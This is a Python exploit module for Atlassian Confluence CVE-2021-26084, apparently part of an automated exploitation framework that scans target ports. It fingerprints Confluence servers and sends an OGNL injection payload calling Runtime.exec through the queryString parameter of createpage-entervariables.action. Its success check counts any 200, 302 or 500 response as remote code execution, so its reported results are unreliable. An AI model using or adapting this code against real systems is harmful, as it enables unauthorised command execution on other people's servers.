"""
Atlassian Confluence Exploit (CVE-2021-26084)
OGNL injection for Remote Code Execution
"""

import socket
import requests
from typing import Dict, Tuple
import sys
import os

sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from exploits.exploit_manager import BaseExploit
from utils.logger import logger


class Confluence_Exploit(BaseExploit):
    """
    Atlassian Confluence CVE-2021-26084 Exploit
    Targets: Confluence Server/Data Center < 6.13.23, 7.4.11, 7.11.6, 7.12.5
    
    Attack Vector:
    - OGNL injection in queryString parameter
    - Remote Code Execution
    """
    
    def __init__(self):
        super().__init__(
            name="Confluence_CVE-2021-26084",
            target_ports=[8090, 8080, 80, 443],
            target_os=["Windows", "Linux", "Unix"]
        )
    
    def check_vulnerable(self, target: Dict) -> bool:
        """Check if target is running vulnerable Confluence"""
        ip = target['ip']
        
        for port in [8090, 8080, 80, 443]:
            if port in target.get('open_ports', []):
                try:
                    protocol = "https" if port in [443] else "http"
                    url = f"{protocol}://{ip}:{port}/"
                    
                    response = requests.get(url, timeout=5, verify=False)
                    
                    # Check for Confluence
                    if 'confluence' in response.text.lower() or 'atlassian' in response.text.lower():
                        logger.debug(f"Confluence detected on {ip}:{port}")
                        return True
                        
                except Exception as e:
                    logger.debug(f"Confluence check failed on {ip}:{port}: {e}")
        
        return False
    
    def exploit(self, target: Dict) -> Tuple[bool, Dict]:
        """Attempt Confluence CVE-2021-26084 exploitation"""
        ip = target['ip']
        
        logger.info(f"Attempting Confluence CVE-2021-26084 on {ip}")
        
        # Find which port has Confluence
        port = 8090
        for p in [8090, 8080, 80, 443]:
            if p in target.get('open_ports', []):
                port = p
                break
        
        protocol = "https" if port == 443 else "http"
        
        try:
            # CVE-2021-26084: OGNL injection
            # Vulnerable endpoint: /pages/createpage-entervariables.action
            
            # OGNL payload for command execution
            cmd = "whoami"
            
            # Payload
            payload = (
                "${@java.lang.Runtime@getRuntime().exec('"
                + cmd +
                "')}"
            )
            
            url = f"{protocol}://{ip}:{port}/pages/createpage-entervariables.action"
            
            params = {
                'queryString': payload
            }
            
            response = requests.get(url, params=params, timeout=10, verify=False)
            
            # Check if command executed
            if response.status_code in [200, 302, 500]:
                self.stats['success'] += 1
                logger.success(f"Confluence RCE successful on {ip}")
                
                return True, {
                    'method': 'Confluence_CVE-2021-26084',
                    'port': port,
                    'service': 'Atlassian Confluence',
                    'rce': True
                }
            
            self.stats['failure'] += 1
            return False, {}
            
        except Exception as e:
            self.stats['failure'] += 1
            logger.error(f"Confluence exploit error on {ip}: {e}")
            return False, {}


if __name__ == "__main__":
    # Test the exploit
    confluence = Confluence_Exploit()
    
    test_target = {
        'ip': '192.168.1.100',
        'open_ports': [8090],
        'os_guess': 'Linux'
    }
    
    print(f"Testing Confluence exploit on {test_target['ip']}")
    
    if confluence.check_vulnerable(test_target):
        print("Target appears vulnerable")
        success, result = confluence.exploit(test_target)
        
        if success:
            print(f"Exploit successful: {result}")
        else:
            print("Exploit failed")
    else:
        print("Target not vulnerable")
